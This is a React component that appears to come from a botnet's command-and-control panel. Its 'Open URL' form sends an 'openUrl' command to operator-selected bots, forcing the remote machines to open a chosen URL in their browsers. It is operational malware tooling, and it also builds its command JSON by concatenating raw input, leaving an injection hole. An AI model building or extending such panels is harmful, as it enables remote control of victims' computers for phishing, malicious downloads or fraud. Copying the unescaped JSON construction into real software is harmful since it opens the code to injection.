import { useContext, useState } from 'react';
import { Button, Input, notification } from "antd"
import { BotContext } from '../providers';
import { setCommand } from '../services';
import { ServerResponseType } from '../../../common/DataType';

export default () => {
  const { state, setState } = useContext(BotContext)
  const [app, setApp] = useState('')

  const submit = () => {
    if (app == '') {
      notification['error']({
        message: 'ERROR',
        description: 'Please fill the app name.'
      })

      return
    }

    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"openUrl","url":"' + app + '"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
    })
  }  
  
  return (
    <div className="pb-6">
      <h2 className="text-xl">Open URL</h2>
      <p className="text-stone-500">Open URL in browser on selected bots</p>
      <Input placeholder="https://google.com" className="!mb-2" value={app} onChange={(e: any) => setApp(e.target.value)}/>
      <Button ghost type="primary" className="float-right" onClick={submit}>Open URL on Bots</Button>
    </div>
  )
}